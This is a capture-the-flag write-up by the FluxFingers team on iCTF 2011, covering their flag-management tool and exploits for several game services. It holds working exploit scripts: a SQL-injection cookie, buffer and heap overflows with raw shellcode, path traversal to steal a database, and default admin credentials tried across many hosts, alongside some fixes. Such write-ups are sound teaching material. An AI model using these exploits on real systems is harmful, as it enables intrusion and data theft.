@@ -1,0 +1,781 @@
+iCTF 2011 write-up 
+
+Team: 
+FluxFingers
+Ruhr-University Bochum (RUB), Germany
+
+January 2012
+
+
+
+RISKMANAGER
+
+
+As we received the set of rules for this year's iCTF, we were stunned by the complexity of the system, hence we sat together and discussed the system and how it works first. Quickly we knew that we would have to  craft a new piece of software that would incorporate all of the games aspects to help us handle the submission of flags. Since we had limited  knowledge of the exact details (like the risk function, the format of  data we would receive and so on) we started laying out a basic concept  and split tasks among few of our programmers.
+
+We called this program our "RiskManager" and most of it was written in Python using MySQL for storing settings, flags and almost everything else. Due to limited time and knowledge of the system we could only forge some  pieces together that would (hopefully) run, though we ran some tests  just to be sure there is no problem with our infrastructure. One of the biggest problems, aside from a missing risk function, was that we had absolutely no idea of the scope of how many flags, money  etc. would have to be processed. This  made it even harder to figure out the right way to handle the  laundering. The approach we finally took was to have 3 policies: 'high risk' for maximized risk at a fixed rate (30%), 'low risk' for  minimized risk at a fixed rate (15%), and 'no risk' which would report every flag to "the FEDs". Furthermore we implemented a blacklist so we could exclude teams, so we would not launder any money with a high ranked team. 
+
+Sadly enough, even though we tried to prepare as good as possible most of those five people who build the RiskManager were occupied most of the  time by fixing the software. Here is a short excerpt of the git commit history:
+692cf5d fix the fix fix
+021a0f9 Merge branch 'master' of 134.147.198.35:iCTF2011_RiskManager
+2a650fc fixed the fix!
+ab61eff more parsing alot to come..
+27e2324 parser shit
+257056f Fixed Bugs!!!11
+
+As you can see, things were a little messed up ;-)
+
+So while we had money as well as flags, our RiskManager did not really want to play along, so some of us started to get stunning 1.4 points by manual submitting flags. Then, only some hours before the CTF was about to end, somebody checked the impact of the parameters in the risk function and figured out that most of them were pure rubbish. This made things a lot more easy and the guys that finally managed to get everything working were raging hard as they could have made things a lot easier. Quickly we dashed up to the Top Five and suddenly everyone panicked, because we were burning money at a very high rate with a "high_risk" policy. Amazed by our meteoric rise, the team switched to challenges and tried to gain as much money as possible so we could, with some final effort, reach rank 3.
+
+In retrospect our RiskManager should have been a little more parallelized, because sometimes it would not be fast enough to catch up with the received flags, but after all it worked and everyone was a bit surprised about that... (those who were not, did not see the code :-) )
+
+Strategy & Tactics:
+To be honest, we did not follow any specific strategy. As usual, we just split up in groups of people who wanted to work together. Some worked on challenges others on services but there was no specific goal (e.g., "solve as many challenges as possible and then start exploiting"), we would rather let everyone decide for themselves what they want to do. Only near the end of the iCTF we tried to focus on solving challenges because we ran low on money.
+
+Pros & Cons:
+In general, we were really happy about all the interesting and well designed challenges and services. On the other hand, we have to criticize the rather complex game mechanics. We really appreciate the huge effort the organizers put into the iCTF, but the game design moves pretty far away from the original aspects of a CTF, that is to say exploiting services and solving challenges. 
+
+
+In the following, we provide a write-up for the various services we analyzed.
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+SENDALERT
+
+The service sendalert was a python webservice running on port 11111 which does… ahm… seriously I do not know. The service got a login form and the game server constantly created new users. It uses a sqlite database which was located under “/home/sendalert/database”. The gameserver saved the flags in this database in the table “users” in the column “data”. The program used prepared SQL statements for all but one query. This query was vulnerable for a SQL injection attack. The python code for this query was in the “status” section:
+
+cur.execute("""select username, data from users where session='%s'"""  % session)
+
+The problem with this query was that the same session has to be saved in the database before you can use it to exploit the service. So first of all we need a registered user. When we register a user, we can see in the python code that the service will give us the fix session “-”.
+
+session = "-"
+cur.execute("""insert into users (username, password, session) values (?,?,?);""", (username, password, session))
+
+Now we have to find a way to change this session value. The only update query that alters the session lies in the depth of the login mechanism.
+
+            session = self.auth()
+            if session == None or session == "" or session == "-" or session == "None":
+                cookie = self.headers.getheaders('Cookie')
+               if cookie != None and len(cookie) != 0:
+                    session = None
+                    morsels = cookie[0].split(";");
+                    self.logger.debug("Parsed cookie: %s" % str(morsels))
+                    for m in morsels:
+                        (var, val) = m.strip().split('=')
+                        if var == self.cookie_name:
+                            session = val
+                            break;
+                else:
+                    self.logger.debug("Session is missing, creating one (%s)" % str(session))
+                    md5 = hashlib.md5()
+                    md5.update(str(time.time()) + username + password + self.secret)
+                    session = md5.hexdigest()
+[...]
+cur.execute("""update users set session=? where username=? and password=?""", (session, username, password))
+
+Here we can see that if we log in with a valid user-password combination, the service will read the “Cookie” value from our request and if it is set, it will change the session in the database to this value. If it is not set, a md5 hash will be generated for the session. The only thing we have to circumvent is the split for “=”.
+
+So finally we create a user and log in. Before we log in we set our “Cookie” value to:
+
+alertsession=' or 1<>2 order by data desc ---
+
+(“alertsession=” is used by the service as a prefix in every session). Now we have changed our session value in the database to
+
+alertsession=' or 1<>2 order by data desc ---
+
+and we can exploit the service. When we now request the page “status” from the web server with our cookie, we inject the SQL query mentioned in the beginning of this write up. The query will look like
+
+select username, data from users where session='alertsession=' or 1<>2 order by data desc ---'
+
+and finally we got the newest flag written on the web site.
+
+A python script that will do all the magic for us looks like:
+
+#!/usr/bin/python
+
+import httplib
+import urllib
+import sys
+
+ip = sys.argv[1]
+
+#http://10.13.187.3:11111/status
+host = "%s:11111" % ip
+cookie = "alertsession=' or 1<>2 order by data desc ---"
+
+try:
+   #username=fluxfingers&password=fluxfingersRules&submit=Register
+   params = urllib.urlencode({'username': 'fluxfingers', 'password': 'fluxfingersRules', 'submit': 'Register'})
+   headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
+   conn = httplib.HTTPConnection(host)
+   conn.request("POST", "/register", params, headers)   
+   response = conn.getresponse()
+
+   params = urllib.urlencode({'username': 'fluxfingers', 'password': 'fluxfingersRules', 'submit': 'Login'})
+   headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain", "Cookie": cookie}
+   conn = httplib.HTTPConnection(host)
+   conn.request("POST", "/login", params, headers)   
+   response = conn.getresponse()
+
+   headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain", "Cookie": cookie}
+   params = ""
+   conn = httplib.HTTPConnection(host)
+   conn.request("GET", "/status", params, headers)
+   response = conn.getresponse()
+   data = response.read()
+except:
+   sys.exit(0)
+
+positionstart = data.find("Subject: ")
+positionend = data.find("</p>",positionstart)
+print data[positionstart+9:positionend]
+
+conn.close()
+
+To fix this issue you just have to change the line
+
+cur.execute("""select username, data from users where session='%s'"""  % session)
+
+to
+
+cur.execute("""select username, data from users where session=?""" , (session, ))
+
+Now it uses prepared statements like the other queries and the vulnerability is fixed.
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+CONVICTS
+
+
+
+The service convicts was an ELF binary listening on port 23 and therefore was accessible via telnet. In addition to the binary itself, we were given a vim swapfile. Unfortunately, vim was not able to recover it. In fact, the swapfile was corrupted. The source was still in it, though. Thus we reversed the line order and did some more formatting, which lead us to the following source:
+
+// CTF11TAG: SERVICE:A AUTODEPLOY USER:PRISON TYPE:CCODE COMPILETO:/home/convicts/bin/toilet COMPILEFLAGS:-lssl
+// TODOS: NONE
+// STATUS: DONE
+
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+#include <openssl/md5.h>
+#include <openssl/evp.h>
+#include <libgen.h>
+
+char result[MD5_DIGEST_LENGTH];
+
+int main(int argc, char **argv) { // let's hope there's not an unintended vuln somewhere here :-)
+
+   char resulthex[1024];
+   int i;
+   FILE *src;
+   FILE *dst;
+   int ssize;
+   int dsize;
+   char dirt[2048];
+   char dt[] = "/home/convicts/jailcell/toilet/tunnel/crap_XXXXXX";
+   char ds[] = "/home/convicts/excercize_yard/sand/message_XXXXXX";
+   char *dfile;
+
+   if (argc < 2)
+   {
+      printf("Do what??\n");
+      exit(1);
+   }
+
+   // there are several modes to this. Fred, when you're writing the score script, you
+   // really only need to use "flush"
+   if (strcmp(argv[1], "look") == 0)
+   {
+      // make sure the message exists
+      if (argc < 3)
+      {
+         printf("What's the message from the lookouts?? We can't mess with the toilet unless it's safe!\n");
+         exit(1);
+      }
+      MD5(argv[2], strlen(argv[2]), result);
+      for(i=0; i < MD5_DIGEST_LENGTH; i++) sprintf(resulthex + 2*i, "%02x", (unsigned char) result[i]);
+      // this looks random, but it's the MD5 of 'OKTODIGNOW!', no newline
+      // note, we should NOT use this in the clear when checking the script
+      if (strcmp(resulthex, "319f1c21d4d43543c1c7d0ac18a56f27") != 0)
+      {
+         printf("Can't check now, the guards are watching!!! Go chill out in your cell.ictf2011.info!\n");
+         exit(1);
+      }
+      system("/bin/ls -1 /home/convicts/jailcell/toilet/tunnel/ | /usr/bin/xargs -I {} /usr/bin/touch /home/convicts/excercize_yard/sand/{}");
+      printf("Ok, dude. You keep a lookout, I'll check out what's down there. I'm gonna write the results in the sand in the excercise yard!\n");
+   }
+   else if (strcmp(argv[1], "sweep") == 0)
+   {
+      printf("You read the list? I'll sweep it up!\n");
+      system("/bin/rm /home/convicts/excercize_yard/sand/*");
+   }
+   else if (strcmp(argv[1], "draw") == 0)
+   {
+      if (argc < 3)
+      {
+         printf("The guards are getting suspicious that we're spending so much time at the excercize yard! We gotta pretend to draw something in the sand. What should we draw??\n");
+         exit(1);
+      }
+      dfile = mktemp(ds);
+      dst = fopen(dfile, "wb");
+      if (dst == NULL)
+      {
+         perror("WTF!!! The sand's erroring out");
+         exit(1);
+      }
+      printf("Writing message %s on the sand!!!\n", basename(dfile));
+      fwrite(argv[2], strlen(argv[2]), 1, dst);
+   }
+   else if (strcmp(argv[1], "flush") == 0)
+   {
+      if (argc < 3)
+      {
+         printf("What should I flush, man??\n");
+         exit(1);
+      }
+      dfile = mktemp(dt);
+      dst = fopen(dfile, "wb");
+      if (dst == NULL)
+      {
+         perror("WTF!!! The toilet's erroring out");
+         exit(1);
+      }
+      printf("Flushing the evidence to %s!!!\n", basename(dfile));
+      fwrite(argv[2], strlen(argv[2]), 1, dst);
+   }
+   else if (strcmp(argv[1], "fish") == 0)
+   {
+      if (argc < 3)
+      {
+         printf("Fish for what??\n");
+         exit(1);
+      }
+      dfile = basename(argv[2]);
+      for (i = 0; i < strlen(dfile); i++)
+      {
+         if ((dfile[i] >= 'A' && dfile[i] <= 'Z') || (dfile[i] >= 'a' && dfile[i] <= 'z') || (dfile[i] >= '0' && dfile[i] <= '9') || dfile[i] == '_' || dfile[i] == '/')
+         {
+            // good
+         }
+         else
+         {
+         dfile[i] = '.';
+         }
+      }
+      chdir("/home/convicts/jailcell/toilet/tunnel/");
+      sprintf(dirt, "/bin/cp %s ../../../cafeteria/cupboard/$(/usr/bin/md5sum %s | /usr/bin/cut -f1 -d' ')", dfile, dfile);
+      system(dirt);
+   }
+   exit(0);
+}
+
+Obviously, there is a hidden parameter (checked by MD5 hash only, which is why the source comes in handy) which allowed us to write the flag names from the non-accessible /tunnel into the readable /sand. We could also move flags to the cupboard, once we knew their names. Unfortunately, it lacked read access as well.
+
+We were a bit puzzled by the possibility to produce ../ sequences for dfile (path traversal) as we found no way to get the program to copy the flags elsewhere. Finally, we discovered that we could open a file as file descriptor for reading using
+
+exec 3< flagname
+
+and read the file using read on the descriptor and echo it:
+
+read f <& 3
+echo $f
+
+To fix the security hole, we simple blocked exec in our rbash, as the gameserver did not seem to use it. Our final exploit looked like this: 
+
+#!/usr/bin/perl
+use Net::Telnet;
+$ip = shift;
+$telnet = new Net::Telnet ( Timeout=>10, Errmode=>'die', Prompt => '/\$ $/i');
+$telnet->open($ip);
+#$telnet->login('bilbo', 'baggins');
+$telnet->cmd('toilet look OKTODIGNOW!');
+@output = $telnet->cmd('echo excercize_yard/sand/*');
+$output = "@output";
+#print $output;
+while($output =~ /crap_(.+?) /g) {
+      $telnet = new Net::Telnet ( Timeout=>10, Errmode=>'die', Prompt => '/\$ $/i');
+      $telnet->open($ip);
+      $telnet->cmd("exec 3< /home/convicts/jailcell/toilet/tunnel/crap_$1");
+      @out = $telnet->cmd("read a <& 3; echo \$a");
+      $out = "@out";
+      $out = "flg".$1 if($out =~ /([a-z0-9]{36})/);
+      print $out."\n" if($out =~ /flg([a-z0-9]{36})/);
+   } 
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+SMSGW
+
+
+
+There are three problems in smsgw that can be combined to achieve remote code execution:
+
+- the memory that contains the msginfo-structure (which contains the data from the incoming network packet) is EXECUTABLE
+- the msginfo-structure can be overrun by sending a network packet that is too large
+- the memory that contains the msginfo-structure and the GOT have fix memory locations and are not randomized
+
+When digging through the disassembly, one can see that the memory related to msginfo is made RWX by calling mprotect. Another hint for the X-property of this memory can be found, when "manage_tcp_client" is called. This is done in a very unconventional way: a "PUSH &manage_tcp_client; RET" is copied to the beginning of the msginfo-buffer and then it is executed. Later on, these two operations are overwritten by the data of the incoming network packet, but the X-property of the related memory remains.
+
+Within the "manage_tcp_client" function the msginfo-buffer is filled by the content of the incoming packet. Since the effective length is not checked, the buffer can be overrun. By sending more than 0x10000 bytes, the two global variables located behind msg_info can be modified to arbitrary values. The first of them -located at 0x0805C100- is then later on used to write to a certain memory location. This write operation occurs at 0x080495C3 by "mov [eax], edx", where edx contains the value from 0x0805C100 and eax points to some location inside of msg_info. However, by using specially crafted "device offset" values within the network packet, it is possible to let eax point to some arbitrary memory location.
+
+So, we can control "where" and "what" is written in an arbitrary 4Byte write operation. As "where" we choose the GOT entry of the "exit" function, which is called when "manage_tcp_client" has processed the incoming network packet. As "what" we choose a memory location that resides within the msg_info-structure and at which we have placed some arbitrary shellcode.
+
+That's it.
+
+Here is python script that can be used to exploit the vulnerability. The executed shellcode simply calls the "system"-function via the GOT, specifying an arbitrary string as command (currently "touch x").
+
+Code:
+
+import socket
+import sys
+from struct import pack
+
+HOST = 'localhost' # The remote host
+PORT = 1991 # The same port as used by the server
+s = None
+
+for res in socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC, socket.SOCK_STREAM):
+af, socktype, proto, canonname, sa = res
+try:
+s = socket.socket(af, socktype, proto)
+except socket.error, msg:
+s = None
+continue
+try:
+s.connect(sa)
+except socket.error, msg:
+s.close()
+s = None
+continue
+break
+if s is None:
+print 'could not open socket'
+sys.exit(1)
+
+packetLen = 0
+time = 'time'
+sender = 'sender'
+subject = 'subject'
+body = 'body1'
+numberOfDevices = 3
+deviceOffset = 0x0804C034 - 0x0804C12A - 4 * 3;
+workingDevice = 'sprint:0'
+
+packet = ''
+packet += pack('!L', len(time))
+packet += time
+packet += pack('!L', len(sender))
+packet += sender
+packet += pack('!L', len(subject))
+packet += subject
+packet += pack('!L', len(body))
+packet += body
+packet += pack('!L', numberOfDevices)
+packet += pack('!L', deviceOffset)
+packet += pack('!L', 0)
+packet += pack('!L', len(workingDevice))
+packet += workingDevice
+
+# shellcode for "call system("touch x")"
+packet += "\xE8\x09\x00\x00\x00\x74\x6F\x75\x63\x68\x20\x78\x00\xCC\xB8\x84\x8A\x04\x08\xFF\xD0"
+packet += "A" * (0x10000 - len(packet)) + pack('L', 0x0804C13E) + pack('L', 0x0)
+
+s.send(pack('!L', len(packet)) + packet)
+s.close() 
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+MULEADMIN
+
+
+Vulnerability: The flags were exposed as groupnames in the admin interface of the mule-website. Another place to find the same flags was inside the /home/muleadmin/tickets/ folder. Inside the Tickets folder were files named with the ticket-name that consists of log-information of the taken actions. New flags were delivered by creating a new group. It was possible to show the contents of an older ticket with knowledge of the ticketname, but this ticketname was chosen by the game-server while delivering the new flags and seemed totally random, so now attack found here. 
+
+Attack 1: Log in with the default admin-credentials admin:admin and crawl the user-control-website. These site showed the flags for the three operations: create user, delete user, delete group. Notice the last flag was the actual flag. These flag were located in the database.
+
+Attack 2: With access to the filesystem, go to the directory of the tickets and extract the actual ticket from the last modified file. Not exploited by us.
+
+
+Patch 1: It was not possible to change the admin-credentials, because then the game-server could not use them to drop new flags, which results in a down service. We checked that twice because other teams did this. So we patched the vulnerability by finding the parts in the PHP code where the flags were shown and modified the loop to show only the two uncomplicated groups "badusers" and "goodusers" and skipped the rest. We changed all three places where the flags were published. These did not mark the service as down.
+
+patch 2: Delete any file in the tickets-folder as soon as one comes up
+
+
+
+Code:
+
+#!/usr/bin/python
+
+import httplib
+import urllib
+import sys
+from BeautifulSoup import BeautifulSoup
+import re
+import socket
+import time
+
+urls = [
+"10.13.129.3", "10.13.130.3", "10.13.131.3", "10.13.132.3", "10.13.134.3",
+"10.13.135.3", "10.13.136.3", "10.13.138.3", "10.13.139.3", "10.13.140.3",
+"10.13.141.3", "10.13.142.3", "10.13.143.3", "10.13.144.3", "10.13.146.3",
+"10.13.147.3", "10.13.151.3", "10.13.152.3", "10.13.154.3", "10.13.157.3",
+"10.13.158.3", "10.13.160.3", "10.13.161.3", "10.13.162.3", "10.13.164.3",
+"10.13.166.3", "10.13.170.3", "10.13.173.3", "10.13.175.3", "10.13.176.3",
+"10.13.177.3", "10.13.178.3", "10.13.179.3", "10.13.181.3", "10.13.182.3",
+"10.13.183.3", "10.13.185.3", "10.13.186.3", "10.13.187.3", "10.13.189.3",
+"10.13.191.3", "10.13.192.3", "10.13.193.3", "10.13.194.3", "10.13.195.3",
+"10.13.196.3", "10.13.197.3", "10.13.198.3", "10.13.199.3", "10.13.201.3",
+"10.13.202.3", "10.13.204.3", "10.13.207.3", "10.13.208.3", "10.13.212.3",
+"10.13.215.3"
+]
+
+while(True):
+  for host in urls:
+    print host
+    flag = ""
+    params = urllib.urlencode({'username': 'admin', 'password': 'admin', 'submit':
+'submit'})
+    headers = {"Content-type": "application/x-www-form-urlencoded",
+                "Accept": "text/plain"}
+    try:
+      conn = httplib.HTTPConnection(host, 80, timeout=5)
+      conn.request("POST", "/login.php", params, headers)
+      response = conn.getresponse()
+
+      data = response.read()
+
+      headers =  response.getheaders()
+      cookie = headers[2][1]
+
+      conn.close()
+
+      ###DELETEGROUP###
+
+      headers = { "Accept": "text/plain",
+                  "Cookie":cookie}
+      conn = httplib.HTTPConnection(host, 80, timeout=5)
+      conn.request("GET", "/~muleadmin/cgi-bin/groups?operation=delete", "", headers)
+      response = conn.getresponse()
+
+      data = response.read()
+
+      soup = BeautifulSoup(data)
+      p = soup.findAll('option')
+
+      for i in p:
+        if(re.search('([a-z0-9]{39})', i.string)):
+          #overwrite until last flag is reached
+          flag=i.string
+      if(flag != ""):
+        print flag
+#        riskman(flag)
+      conn.close()
+
+    except:
+      pass
+  time.sleep(30)
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+MAILGW
+
+
+mailgw listens on TCP Port 9119 by default. You can connect to it with for example netcat and send commands. The service enables you to create a "user" which creates a file in /home/mailgateway/messages. Then you can
+add recipients, list recipients, remove recipients, write a message and send a message to the given recipients which leads to the message being written to the users file.
+
+Commands are initiated by a single character:
+
+   n: Create account (opens /home/mailgateway/messages/name, "a+")
+   q: Quit
+   +: Add recipient
+   -: Remove recipient
+   l: List recipients
+   r: Rewind file
+   s: Send message
+   m: Write message
+   
+Syntaxes for the commands differ a little but the important parts are only the add and remove recipient commands, anyways. The '+' command looks like this:
+
+------------------------------
+case '+':
+      rcptBuf = (char *)malloc(0x11Cu);
+      pagesize = getpagesize();
+      endAligned = (unsigned int)&rcptBuf[pagesize + 283] & -pagesize;
+      startAligned = (void *)(-pagesize & (unsigned int)rcptBuf);
+      mprotect(startAligned, endAligned - startAligned, PROT_READ | PROT_WRITE | PROT_EXECUTE);
+      // READ, WRITE, EXECUTE!!
+     
+      *((_DWORD *)rcptBuf + 64) = basic_sanitize;// func ptr @ buf + 64*4 = 256
+     
+      //Write 260 Bytes to reach Shellcode
+      //Overwrite Shellcode and remove rcpt to trigger payload
+     
+      pShellcode = rcptBuf + 260;               // shellcode @ buf + 260
+      i = 0;
+      rcptBuf[260] = 0xCCu;                     // int 3
+      ++i;
+      *(_DWORD *)&pShellcode[i] = 0x82474FFu;   // shellcode
+      i += 4;
+      *(_DWORD *)&pShellcode[i] = 0x82454FFu;
+      i += 4;
+      *(_DWORD *)&pShellcode[i] = 0xC304C483u;
+      i = 0;
+      for (;;) {
+   // NO boundary checking
+   // NO strcpy (can write 0-bytes), reads until |
+        if (read(0, &ptr, 1u))
+        {
+          rcptBuf[i] = ptr;
+          if (ptr != '|') {
+            ++i;
+            continue;
+          }
+          rcptBuf[i] = 0;
+        }
+        break;
+      }
+      if ( debug )
+        fprintf(stderr, "Created recipient %s\n", rcptBuf);
+   
+   // List stuff
+      *((_DWORD *)rcptBuf + 69) = recipients;
+      *((_DWORD *)rcptBuf + 70) = recipients[70];
+      *(_DWORD *)(*((_DWORD *)rcptBuf + 70) + 4*69) = rcptBuf;
+      *(_DWORD *)(*((_DWORD *)rcptBuf + 69) + 4*70) = rcptBuf;
+      goto doCmd;
+------------------------------
+
+A buffer of size 0x11C is allocated as rwx and then initialized with some values. At offset 256 a function pointer to the basic_sanitize function is stored. After that, from offset 260 onwards, there are 13 bytes written which are valid x86 instructions:
+
+------------------------------
+CC               int3
+FF7424 08        push    dword ptr [esp+8]
+FF5424 08        call    near dword ptr [esp+8]
+83C4 04          add     esp, 4
+C3               retn
+------------------------------
+
+However, reading from the socket into the buffer occurs until a | character is found. No length check here. That means we can overwrite the inlined instructions as well as the function pointer. To see how we can actually trigger the vulnerability, we have to look into the function for removing a recipient:
+
+------------------------------
+    case '-':
+      i = 0;
+      while (true) {
+        if (read(0, &ptr, 1u)) {
+          delrcptBuf[i] = ptr;
+          if (ptr !=  '|') {
+            ++i;
+            if (i == 0x100)
+              break;
+            continue;
+          }
+          delrcptBuf[i] = 0;
+        }
+        break;
+      }
+      if (debug)
+        fprintf(stderr, "Deleting recipient %s\n", delrcptBuf);
+   
+      //foreach
+      for (rcptBuf = (char *)recipients[69]; (_DWORD *)rcptBuf != recipients; rcptBuf = (char *)*((_DWORD *)rcptBuf + 69)) {
+        //strcmp (until 0byte)
+        if (!strcmp(delrcptBuf, rcptBuf)) {
+          ((void (__cdecl *)(_DWORD, char *))(rcptBuf + 261))(*((_DWORD *)rcptBuf + 64), rcptBuf);// call shellcode
+          *(_DWORD *)(*((_DWORD *)rcptBuf + 69) + 280) = *((_DWORD *)rcptBuf + 70);
+          *(_DWORD *)(*((_DWORD *)rcptBuf + 70) + 276) = *((_DWORD *)rcptBuf + 69);
+          if (debug)
+            fprintf(stderr, "Recipient %s removed\n", delrcptBuf);
+          free(rcptBuf);
+          rcptBuf = 0;
+          break;
+        }
+      }
+      if (debug && rcptBuf)
+        fprintf(stderr, "Recipient %s not found\n", delrcptBuf);
+      goto doCmd;
+------------------------------
+
+We can see how it searches the list for a matching recipient to remove via strcmp. If found, the functions calls the instructions at buffer + 261 (therefore behind the int 3 at 260) with two parameters: The first one is the address in buf + 256 (originally a pointer to the basic_sanitize function) and the second one a pointer to the buffer.
+
+So, what do we have to do?
+   1. Add an recipient like this +foo\0[shellcode][instructions]|
+      - Because reading stops at | not at a 0byte, we can pretend the name with a normal name so we can later
+      easily remove it (because strcmp is used)
+      - The instructions are very important since they get passed a pointer to the buffer which enables us to
+      jump there.
+      - Shellcode must be padded to 261 - 4 bytes.
+   2. Remove the recipient like this: -foo|
+      - It will match the one above because the shellcode is separated from the name with a 0byte that makes
+      strcmp stop
+      
+The instructions get passed a pointer to the beginning of the buffer. Therefore to the whole foo\0[shellcode] thing. Because of that we will have to add 4 to it and jump to the shellcode then. For the instructions I used this:
+
+------------------------------
+58                 pop     eax
+58                 pop     eax
+830424 04          add     dword ptr [esp], 4
+C3                 retn
+------------------------------
+
+Which is $instructions = "\x58\x58\x83\x04\x24\04\xc3";
+As shellcode for testing I suggest
+
+------------------------------
+B8 01000000        mov     eax, 1
+CD 80              int     80
+------------------------------
+
+Which is $shellcode = "\xb8\1\0\0\0\xcd\x80";
+Now we can put it all together:
+
+------------------------------
+#!/usr/bin/perl
+#foo.pl
+$shellcode = "\xb8\1\0\0\0\xcd\x80";
+$instructions = "\x58\x58\x83\x04\x24\x04\xc3";
+
+$addrcpt = "+foo\0" . $shellcode . ('A'x(261 - 4 - length($shellcode))) . $instructions . '|';
+$delrcpt = '-foo|';
+
+print $addrcpt . $delrcpt;
+------------------------------
+
+$ ./foo.pl | nc localhost 9119
+...
+[Inferior 6 (process 22756) exited with code 0364]
+
+We can now easily replace this exit() shellcode with for example a reverse shell.
+
+All in all, this challenge was quite entertaining and also very rewarding.
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+MSGDISPATCHER
+
+
+In msgdispatcher there was path traversal which made it possible to steal the sqlite database from egoats. So we just had to steal the db and parse it for flags.
+
+I decided it was easier to save the db and open it with sqlite3 library than to do regex parsing, so I did that (though it was a bit more performance intense)
+
+Code:
+#!/usr/bin/python
+import sys, re
+from urllib2 import *
+import thread, time
+import sqlite3
+active = {}
+lock = thread.allocate_lock()
+thread_count = 0
+ips = ("10.13.129.3", "10.13.130.3", "10.13.131.3", "10.13.132.3", "10.13.134.3", "10.13.135.3", "10.13.136.3", "10.13.138.3", "10.13.139.3", "10.13.140.3", "10.13.141.3", "10.13.142.3", "10.13.143.3", "10.13.144.3", "10.13.146.3", "10.13.147.3", "10.13.151.3", "10.13.152.3", "10.13.154.3", "10.13.157.3", "10.13.158.3", "10.13.160.3", "10.13.161.3", "10.13.162.3", "10.13.164.3", "10.13.166.3", "10.13.170.3", "10.13.173.3", "10.13.175.3", "10.13.176.3", "10.13.177.3", "10.13.178.3", "10.13.179.3", "10.13.181.3", "10.13.182.3", "10.13.183.3", "10.13.185.3", "10.13.186.3", "10.13.187.3", "10.13.189.3", "10.13.191.3", "10.13.192.3", "10.13.193.3", "10.13.194.3", "10.13.195.3", "10.13.196.3", "10.13.197.3", "10.13.198.3", "10.13.199.3", "10.13.201.3", "10.13.202.3", "10.13.204.3", "10.13.207.3", "10.13.208.3", "10.13.212.3", "10.13.215.3")   
+   
+def getDB(ip):
+   try:
+      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      sock.connect((ip, 31337))
+      sock.send("STATUS ../../egoats/db/production.sqlite3\n")
+      sqlite = sock.recv(2000000)
+      sock.close()
+      f = open("prod"+ip+".sqlite3", "wb")
+      f.write(sqlite)
+      f.close();
+      return True
+   except:
+      return False
+      
+def loadDB(ip):
+   try:
+      conn = sqlite3.connect("prod"+ip+".sqlite3")
+      cur = conn.cursor()
+      cur.execute("SELECT token, created_at FROM remote_payments ORDER BY created_at ASC")
+      return cur
+   except:
+      return False
+
+def getFlag(ip):
+   #global active, lock, thread_count
+   #lock.acquire()
+   #active[ip] = True
+   #thread_count += 1
+   #lock.release()
+   #active[ip] = True
+   if(getDB(ip)):
+            cur = loadDB(ip)
+            if(cur):
+               for row in cur.fetchall():
+                  m = re.search('flg.{36}', row[0], re.DOTALL)
+                  try:
+                     if(m):
+                        flag = m.group(0)
+                        time = row[1]
+                  except:
+                     pass   
+               
+               print flag
+   #lock.acquire()
+   #active[ip] = False
+   #thread_count -= 1
+   #lock.release()
+      
+getFlag(sys.argv[1])
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+MULEUSER
+
+
+
+In mule user, flags were visible for registered users. We built a script that creates a new user and retrieves the flags. To work around the issue, we modified the server to not print messages which contain a flag (beginning with flg...).
+
+Code:
+
+#!/usr/bin/perl
+use WWW::Mechanize::GZip;
+use IO::Socket;
+###### Options ######
+
+$name = 'Test';
+$pw =  'test';
+$submit = 'submit';
+$ip = $ARGV[0];
+
+my @myarray = ();
+#####################
+
+# Browserkomponente initialisieren
+my $mech = WWW::Mechanize::GZip->new();
+
+$response = $mech->get('http://' . $ip . '/register');
+               
+# Registrieren
+$response = $mech->post('http://' . $ip . '/register', [ username => $name, pass => $pw, repeat_pass => $pw, submit => $submit ]);
+               
+# Login
+$response = $mech->post('http://' . $ip . '//login.php', [ username => $name, password => $pw, submit => $submit ]);
+   
+# Valide Subscribe-IDs abfragen
+$response = $mech->get('http://' . $ip . '/~muleuser/cgi-bin/sendmessage');
+#print $response->content;
+   
+@myarray = ($response->content =~ m/<option value=\"(.*)\">/g);
+   
+foreach(@myarray)
+{
+        print $_ . "
+";
+}
